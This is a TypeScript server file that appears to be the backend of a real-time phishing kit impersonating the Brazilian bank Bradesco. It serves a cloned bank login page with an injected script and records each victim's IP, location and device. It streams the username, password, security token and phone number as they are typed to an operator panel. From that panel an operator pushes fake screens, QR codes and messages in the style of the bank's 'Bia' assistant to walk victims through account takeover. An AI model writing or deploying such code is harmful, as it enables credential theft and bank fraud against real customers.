import "dotenv/config";
import express from "express";
import { createServer } from "http";
import path from "path";
import fs from "fs";
import { Server } from "socket.io";
import { loadSessions, saveSessions, ClientSession } from "./persistence";

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
  maxHttpBufferSize: 10 * 1024 * 1024,
});

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

// Carregar sessões persistidas
const sessions = loadSessions();

// Salvar sessões periodicamente
setInterval(() => {
  saveSessions(sessions);
}, 5000);

function getClientIp(req: any): string {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    return (forwarded as string).split(",")[0].trim();
  }
  return req.socket?.remoteAddress || "127.0.0.1";
}

async function geoLocate(ip: string) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city`);
    const data = await response.json();
    if (data.status === 'success') {
      return {
        pais: data.country || "Desconhecido",
        estado: data.regionName || "Desconhecido",
        cidade: data.city || "Desconhecido"
      };
    }
  } catch (err) {
    console.error('[GEO] Erro ao consultar geolocalização:', err);
  }
  return { pais: "Desconhecido", estado: "Desconhecido", cidade: "Desconhecido" };
}

function detectDevice(ua: string): string {
  if (!ua) return "Desconhecido";
  const lowerUA = ua.toLowerCase();
  if (lowerUA.includes("iphone") || lowerUA.includes("ipad") || lowerUA.includes("ipod")) return "iOS";
  if (lowerUA.includes("android")) return "Android";
  if (lowerUA.includes("windows")) return "Windows";
  if (lowerUA.includes("macintosh") || lowerUA.includes("mac os")) return "MacOS";
  if (lowerUA.includes("linux")) return "Linux";
  return "Desktop";
}

function snapshotSessions() {
  return Array.from(sessions.values()).map(s => ({ ...s }));
}

// ---- Autenticação Simples para o Operador ----
const OPERATOR_PASSWORD = "151612";

app.post("/api/login", (req, res) => {
  const { password } = req.body;
  if (password === OPERATOR_PASSWORD) {
    res.json({ success: true, token: "session_valid" });
  } else {
    res.status(401).json({ success: false, message: "Senha incorreta" });
  }
});

// ---- Servir Assets Estáticos do Cliente ----
const bradescoPublicDir = path.resolve(process.cwd(), "client/public");

// Servir tudo na raiz para compatibilidade com caminhos relativos do HTML original
app.use(express.static(bradescoPublicDir));

// Rota específica para o cliente
app.get("/cliente", (req, res) => {
  const htmlPath = path.join(bradescoPublicDir, "bradesco.html");
  if (!fs.existsSync(htmlPath)) {
    res.status(500).send("bradesco.html não encontrado");
    return;
  }
  let html = fs.readFileSync(htmlPath, "utf-8");
  
  // Injetar scripts no final do head para não quebrar o carregamento original
  const inject = `
<script src="/socket.io/socket.io.js"></script>
<script src="/cliente-bridge.js"></script>
<link rel="stylesheet" href="/__bridge__/cliente-bridge.css">
`;
  html = html.replace("</head>", `${inject}</head>`);
  
  res.set("Content-Type", "text/html; charset=utf-8");
  res.send(html);
});

// Mapear bridge scripts
app.get("/cliente-bridge.js", (_req, res) => {
  res.sendFile(path.join(bradescoPublicDir, "__bridge__/cliente-bridge.js"));
});

// Servir o Painel do Operador (React Build)
const distPath = path.resolve(process.cwd(), "dist");
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
  app.get("/admin*", (req, res) => {
    const indexPath = path.join(distPath, "index.html");
    if (fs.existsSync(indexPath)) {
      res.sendFile(indexPath);
    } else {
      res.status(404).send("Admin Panel build not found.");
    }
  });
}

// ---- WebSocket ----
io.on("connection", socket => {
  const role = (socket.handshake.query.role as string) || "client";
  const ip = getClientIp(socket.request);
  const ua = socket.handshake.headers["user-agent"] || "";

  if (role === "operator") {
    socket.join("operators");
    socket.emit("operator:sessions", snapshotSessions());

    socket.on("operator:command", (data: { sessionId: string; command: string; payload?: any }) => {
      const s = sessions.get(data.sessionId);
      if (!s) return;
      s.telaAtual = data.command;
      s.ultimaAtualizacao = Date.now();
      if (s.socketId) {
        io.to(s.socketId).emit("client:command", { command: data.command, payload: data.payload });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    socket.on("operator:enviar-info", (data: { sessionId: string; nome: string; serial: string; qrCode?: string }) => {
      const s = sessions.get(data.sessionId);
      if (!s) return;
      s.nomeEnviado = data.nome || s.nomeEnviado;
      s.serialEnviado = data.serial || s.serialEnviado;
      if (data.qrCode) s.qrCodeEnviado = data.qrCode;
      s.ultimaAtualizacao = Date.now();
      if (s.socketId) {
        io.to(s.socketId).emit("client:info", { nome: s.nomeEnviado, serial: s.serialEnviado, qrCode: s.qrCodeEnviado });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    socket.on("operator:bia-message", (data: { sessionId: string; texto: string }) => {
      const s = sessions.get(data.sessionId);
      if (!s) return;
      s.mensagensBia.push({ de: "operador", texto: data.texto, ts: Date.now() });
      s.ultimaAtualizacao = Date.now();
      if (s.socketId) {
        io.to(s.socketId).emit("client:bia-message", { texto: data.texto, ts: Date.now() });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    socket.on("operator:qrcode", (data: { sessionId: string; qrCode: string }) => {
      const s = sessions.get(data.sessionId);
      if (!s) return;
      s.qrCodeEnviado = data.qrCode;
      s.ultimaAtualizacao = Date.now();
      if (s.socketId) {
        io.to(s.socketId).emit("client:qrcode", { qrCode: data.qrCode });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    socket.on("operator:delete-session", (data: { sessionId: string }) => {
      const s = sessions.get(data.sessionId);
      if (s && s.socketId) {
        io.to(s.socketId).emit("client:disconnect");
      }
      sessions.delete(data.sessionId);
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    return;
  }

  // CLIENTE
  const sessionId = ip;
  let s = sessions.get(sessionId);
  const device = detectDevice(ua);

  if (!s) {
    geoLocate(ip).then(geo => {
      const newSession: ClientSession = {
        sessionId,
        socketId: socket.id,
        operatorSocketId: null,
        usuario: "",
        senha: "",
        ip,
        pais: geo.pais,
        estado: geo.estado,
        cidade: geo.cidade,
        device: device,
        status: "online",
        telaAtual: "login",
        conectadoEm: Date.now(),
        ultimaAtualizacao: Date.now(),
        token: "",
        ddd: "",
        telefone: "",
        mensagensBia: [],
        avatarBia: "",
        nomeEnviado: "",
        serialEnviado: "",
        qrCodeEnviado: "",
      };
      sessions.set(sessionId, newSession);
      socket.emit("client:welcome", { sessionId });
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
  } else {
    s.socketId = socket.id;
    s.status = "online";
    s.device = device;
    s.ultimaAtualizacao = Date.now();
    socket.emit("client:welcome", { sessionId });
    io.to("operators").emit("operator:sessions", snapshotSessions());
  }

  socket.on("client:input", (data: { campo: string; valor: string }) => {
    const sess = sessions.get(sessionId);
    if (!sess) return;
    if (data.campo === "usuario") sess.usuario = data.valor;
    if (data.campo === "senha") sess.senha = data.valor;
    if (data.campo === "token") sess.token = data.valor;
    if (data.campo === "ddd") sess.ddd = data.valor;
    if (data.campo === "telefone") sess.telefone = data.valor;
    sess.ultimaAtualizacao = Date.now();
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });

  socket.on("client:tela-mudou", (data: { tela: string }) => {
    const sess = sessions.get(sessionId);
    if (!sess) return;
    sess.telaAtual = data.tela;
    sess.ultimaAtualizacao = Date.now();
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });

  socket.on("client:bia-message", (data: { texto: string }) => {
    const sess = sessions.get(sessionId);
    if (!sess) return;
    sess.mensagensBia.push({ de: "cliente", texto: data.texto, ts: Date.now() });
    sess.ultimaAtualizacao = Date.now();
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });

  socket.on("disconnect", () => {
    const sess = sessions.get(sessionId);
    if (sess) {
      sess.socketId = null;
      sess.status = "offline";
      sess.ultimaAtualizacao = Date.now();
    }
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });
});

const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
